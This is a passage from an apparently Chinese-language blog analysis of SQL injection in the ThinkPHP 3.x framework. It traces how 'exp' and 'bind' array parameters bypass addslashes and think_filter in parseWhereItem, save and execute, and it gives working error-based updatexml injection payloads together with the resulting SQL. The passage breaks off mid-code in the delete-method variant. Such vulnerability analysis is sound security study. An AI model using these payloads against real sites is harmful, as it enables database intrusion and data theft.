class="string">&#x27;:&#x27;</span>) === <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$value</span>,<span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;bind))? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$value</span>) : <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$value</span>).<span class="string">&#x27;\&#x27;&#x27;</span>;<span class="comment">//escapeString -&gt; addslashes</span></span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$value</span>[<span class="number">0</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>[<span class="number">0</span>]) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>[<span class="number">0</span>]) == <span class="string">&#x27;exp&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$value</span> =  <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$value</span>[<span class="number">1</span>]);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="variable">$value</span> =  <span class="title function_ invoke__">array_map</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="string">&#x27;parseValue&#x27;</span>),<span class="variable">$value</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_bool</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="variable">$value</span> =  <span class="variable">$value</span> ? <span class="string">&#x27;1&#x27;</span> : <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="variable">$value</span> =  <span class="string">&#x27;null&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="bind注入"><a href="#bind注入" class="headerlink" title="bind注入"></a>bind注入</h3><p>前面提到在<code>ThinkPHP/Library/Think/Db/Driver.class.php</code>的<code>parseWhereItem</code>函数中,满足某些条件时可以绕过<code>parseValue</code>的<code>addslashes</code>处理</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="string">&#x27;bind&#x27;</span> == <span class="variable">$exp</span> )&#123; <span class="comment">// 使用表达式</span></span><br><span class="line">    <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; = :&#x27;</span>.<span class="variable">$val</span>[<span class="number">1</span>]; <span class="comment"># !!! 可能存在利用点,因为没有进行parseValue</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="string">&#x27;exp&#x27;</span> == <span class="variable">$exp</span> )&#123; <span class="comment">// 使用表达式</span></span><br><span class="line">    <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$val</span>[<span class="number">1</span>]; <span class="comment"># !!! 可能存在利用点,因为没有进行parseValue</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$val</span>);</span><br><span class="line"><span class="variable">$rule</span>  = <span class="keyword">isset</span>(<span class="variable">$val</span>[<span class="variable">$count</span>-<span class="number">1</span>]) ? (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>[<span class="variable">$count</span>-<span class="number">1</span>]) ? <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$val</span>[<span class="variable">$count</span>-<span class="number">1</span>][<span class="number">0</span>]) : <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$val</span>[<span class="variable">$count</span>-<span class="number">1</span>]) ) : <span class="string">&#x27;&#x27;</span> ; </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$rule</span>,<span class="keyword">array</span>(<span class="string">&#x27;AND&#x27;</span>,<span class="string">&#x27;OR&#x27;</span>,<span class="string">&#x27;XOR&#x27;</span>))) &#123;</span><br><span class="line">    <span class="variable">$count</span>  = <span class="variable">$count</span> -<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$rule</span>   = <span class="string">&#x27;AND&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$count</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>[<span class="variable">$i</span>])?<span class="variable">$val</span>[<span class="variable">$i</span>][<span class="number">1</span>]:<span class="variable">$val</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;exp&#x27;</span>==<span class="title function_ invoke__">strtolower</span>(<span class="variable">$val</span>[<span class="variable">$i</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">        <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$data</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$rule</span>.<span class="string">&#x27; &#x27;</span>; <span class="comment"># !!! 可能存在利用点,因为没有进行parseValue</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入<code>name[]=exp</code>或者<code>name[][]=exp</code>,debug时会发现字符串<code>exp</code>会在后面增加一个空格</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203172040630.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203172041491.png"></p>
<p>原因在于前面提到的<code>I</code>的方法的特殊处理,在<code>I</code>方法的最后调用了<code>think_filter</code>这一过滤函数,在敏感词的后面加了一个空格</p>
<p>这里有两种处理方法</p>
<ol>
<li>不使用<code>I</code>方法获取参数,直接使用<code>$_GET</code>进行获取</li>
</ol>
<p><code>$name = $_GET[&#39;name&#39;];</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191553196.png"></p>
<p><code>name[]=exp&amp;name[]==1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191556302.png"></p>
<ol start="2">
<li>绕过<code>think_filter</code>限制</li>
</ol>
<p>注意到在<code>parseWhereItem</code>函数是会对<code>bind</code>进行特殊处理的,但是<code>think_filter</code>没有对<code>bind</code>进行过滤,由此当<code>name[]=bind</code>时,可以将数据</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    <span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>) &amp;&amp; <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>,<span class="string">&#x27;think_filter&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_filter</span>(<span class="params">&amp;<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// TODO 其他安全过滤</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>,<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="variable">$value</span> .= <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191546247.png"></p>
<p>最终得到的<code>wherestr</code>为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`username` = :asdf</span><br></pre></td></tr></table></figure>

<p>由于<code>=:</code>的存在,这玩意用来引用绑定变量,我们要消除<code>:</code>对于sql语句的影响</p>
<ol>
<li>使用<code>save</code>方法</li>
</ol>
<p>thinkphp将update操作封装在<code>save</code>方法中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.name&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$name</span>))-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>name[]=bind&amp;name[]=0 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191638475.png"></p>
<p><code>save</code>方法同样会调用<code>parseWhere</code>并进入到<code>parseWhereItem</code>中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ThinkPHP/Library/Think/Model.class.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$pk</span>]))&#123;</span><br><span class="line">        <span class="variable">$pkValue</span>    =   <span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$pk</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_before_update</span>(<span class="variable">$data</span>,<span class="variable">$options</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span>     =   <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$data</span>,<span class="variable">$options</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pkValue</span>)) <span class="variable">$data</span>[<span class="variable">$pk</span>]   =  <span class="variable">$pkValue</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_after_update</span>(<span class="variable">$data</span>,<span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#ThinkPHP/Library/Think/Db/Driver.class.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$options</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;model  =   <span class="variable">$options</span>[<span class="string">&#x27;model&#x27;</span>];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseBind</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>]:<span class="keyword">array</span>());</span><br><span class="line">    <span class="variable">$table</span>  =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span>   = <span class="string">&#x27;UPDATE &#x27;</span> . <span class="variable">$table</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseSet</span>(<span class="variable">$data</span>); <span class="comment">//关键点1</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$table</span>,<span class="string">&#x27;,&#x27;</span>))&#123;<span class="comment">// 多表更新支持JOIN操作</span></span><br><span class="line">        <span class="variable">$sql</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseJoin</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sql</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseWhere</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);<span class="comment">//关键点2</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$table</span>,<span class="string">&#x27;,&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">//  单表更新支持order和lmit</span></span><br><span class="line">        <span class="variable">$sql</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseOrder</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>]:<span class="string">&#x27;&#x27;</span>).<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseLimit</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sql</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseComment</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$sql</span>,!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);<span class="comment">//关键点3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先在<code>parseSet</code>对<code>=:</code>进行解析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ThinkPHP/Library/Think/Db/Driver.class.php</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSet</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; <span class="string">&#x27;exp&#x27;</span> == <span class="variable">$val</span>[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="variable">$set</span>[]  =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>).<span class="string">&#x27;=&#x27;</span>.<span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$val</span>))&#123;</span><br><span class="line">            <span class="variable">$set</span>[]  =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>).<span class="string">&#x27;=NULL&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$val</span>)) &#123;<span class="comment">// 过滤非标量数据</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>,<span class="string">&#x27;:&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$val</span>,<span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;bind)) )&#123;</span><br><span class="line">                <span class="variable">$set</span>[]  =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>).<span class="string">&#x27;=&#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$val</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$name</span>   =   <span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;bind);</span><br><span class="line">                <span class="variable">$set</span>[]  =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>).<span class="string">&#x27;=:&#x27;</span>.<span class="variable">$name</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="variable">$name</span>,<span class="variable">$val</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; SET &#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$set</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#ThinkPHP/Library/Think/Db/Driver.class.php</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">bindParam</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;bind[<span class="string">&#x27;:&#x27;</span>.<span class="variable">$name</span>]  =   <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191722861.png"></p>
<p>然后进行<code>parseWhereItem</code>操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191638739.png"></p>
<p>此时<code>wherestr</code>的值为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`username` = :0 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>在返回到<code>parseWhere</code>后得到的<code>wherestr</code>为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE `username` = :0 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>此时<code>$sql</code>为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `user` SET `password`=:0 WHERE `username` = :0 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>最后进入到<code>execute</code>函数中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$fetchSql</span>=<span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;bind))&#123;</span><br><span class="line">        <span class="variable">$that</span>   =   <span class="variable language_">$this</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;queryStr =   <span class="title function_ invoke__">strtr</span>(<span class="variable">$this</span>-&gt;queryStr,<span class="title function_ invoke__">array_map</span>(function(<span class="variable">$val</span>) <span class="keyword">use</span>(<span class="variable">$that</span>)&#123; <span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$that</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$val</span>).<span class="string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="variable language_">$this</span>-&gt;bind));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191707272.png"></p>
<p><code>bind=array(&#39;:0&#39;=&gt;&#39;123456&#39;)</code></p>
<p>首先通过<code>array_map</code>对<code>bind</code>数组的每个元素进行<code>addslashes</code>操作,然后利用<code>strtr</code>对<code>$this-&gt;queryStr</code>进行替换(<code>:0</code>被替换成<code>123456</code>)</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203191710202.png"></p>
<p>由此造成了sql注入</p>
<ol start="2">
<li>使用<code>delete</code>方法</li>
</ol>
<blockquote>
<p>这个利用方法比较奇怪…</p>
</blockquote>
<p>查找<code>parseWhere</code>的用法,除了<code>update</code>方法外,还有<code>delete</code>方法对其进行调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201233880.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;model  =   <span class="variable">$options</span>[<span class="string">&#x27;model&#x27;</span>];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseBind</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>]:<span class="keyword">array</span>());</span><br><span class="line">    <span class="variable">$table</span>  =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span>    =   <span class="string">&#x27;DELETE FROM &#x27;</span>.<span class="variable">$table</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$table</span>,<span class="string">&#x27;,&#x27;</span>))&#123;<span class="comment">// 多表删除支持USING和JOIN操作</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;using&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$sql</span> .= <span class="string">&#x27; USING &#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;using&#x27;</span>]).<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseJoin</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sql</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseWhere</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$table</span>,<span class="string">&#x27;,&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// 单表删除支持order和limit</span></span><br><span class="line">        <span class="variable">$sql</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseOrder</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>]:<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        .<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseLimit</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sql</span> .=   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseComment</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>])?<span class="variable">$options</span>[<span 